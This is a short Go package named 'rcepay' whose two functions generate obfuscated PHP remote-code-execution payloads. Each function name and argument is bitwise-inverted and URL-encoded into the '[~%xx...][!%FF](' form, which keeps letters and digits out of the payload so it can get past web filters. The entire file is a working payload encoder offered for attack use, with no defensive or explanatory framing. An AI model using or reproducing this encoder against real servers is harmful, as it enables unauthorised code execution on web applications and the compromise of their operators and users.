package rcepay

import (
	"fmt"
	"strings"
)

// Urlbm函数将字符串s中的每个字符转换为特定格式的字符串
func Urlbm(s string) string {
	var ss string
	for _, each := range s {
		ss += "%" + fmt.Sprintf("%x", 255-int(each))
	}
	return "[~" + ss + "][!%FF]("
}

// Execute函数根据payload的内容执行不同的操作并返回特定格式的字符串
func Execute(payload *string) string {
	if strings.Contains(*payload, "(") {
		fun := strings.Split(strings.TrimSuffix(*payload, ")"), "(")
		exp := ""
		for _, each := range fun[:len(fun)-1] {
			exp += Urlbm(each)
		}
		exp += strings.Repeat(")", len(fun)-1) + ";"
		return exp
	} else {
		exp := ""
		for _, each1 := range *payload {
			exp += Urlbm(string(each1))
		}
		return exp
	}
}
